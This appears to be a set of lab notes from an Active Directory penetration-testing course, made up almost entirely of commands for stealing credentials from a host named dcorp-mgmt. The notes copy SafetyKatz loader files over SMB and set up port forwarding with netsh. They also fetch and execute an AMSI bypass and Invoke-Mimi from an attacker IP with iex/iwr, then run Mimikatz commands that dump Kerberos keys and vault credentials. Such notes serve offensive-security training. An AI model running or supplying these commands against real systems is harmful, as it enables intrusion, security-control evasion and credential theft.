## SafetyKatz for extracting credentials:

**Copy the Loader.exe and Safety.bat to dcorp-mgmt:**
```
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
echo F | xcopy C:\AD\Tools\Safety.bat \\dcorp-mgmt\C$\Users\Public\Safety.bat
```

**Extract credentials:**
```
winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1"
winrs -r:dcorp-mgmt C:\Users\Public\Safety.bat
```

## Invoke-Mimi for extracting credentials:

**Connect with PSRemoting:**
```powershell
Enter-PSSession -ComputerName dcorp-mgmt
$env:username
```

**Bypass AMSI:**
```powershell
iex (iwr http://172.16.100.1/amsibypass.txt -UseBasicParsing)
```

**Download and Execute Invoke-Mimi:**
```powershell
iex (iwr http://172.16.100.1/Invoke-Mimi.ps1 - UseBasicParsing)
```

**Execute Invoke-Mimiatz:**
```powershell
Invoke-Mimi -Command '"sekurlsa::ekeys"'
```

**Look for credentials from the credentials vault:**
```powershell
Invoke-Mimi -Command '"token::elevate" "vault::cred /patch"'
```
